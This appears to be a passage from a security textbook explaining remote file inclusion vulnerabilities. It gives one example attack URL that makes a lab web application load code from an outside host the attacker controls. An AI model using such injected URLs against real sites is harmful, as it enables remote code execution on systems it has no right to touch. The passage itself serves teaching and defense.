Remote file inclusion (RFI) vulnerabilities are similar to LFI vulnerabilities. However, when an attacker exploits an RFI vulnerability, instead of accessing a file on the victim, the attacker is able to execute code hosted on his or her own system (the attacking system).

**NOTE** RFI vulnerabilities are trivial to exploit; however, they are less common than LFI vulnerabilities.

Figure 6-23 shows an example of exploiting a remote file inclusion vulnerability.

The attacker enters the following URL to perform the attack in Figure 6-23:

`http://192.168.78.8:66/vulnerabilities/fi/?page=http://malicious.h4cker.org/malware.html`

In this example, the attackerâ€™s website (http://malicious.h4cker.org/malware.html) is likely to host malware or malicious scripts that can be executed when the victim visits that site.

**NOTE** The URL [_http://malicious.h4cker.org/malware.html_](http://malicious.h4cker.org/malware.html) is a real URL, but it is not a malicious site. If you connect to it in a web browser, you will see a message similar to the one in Figure 6-23.
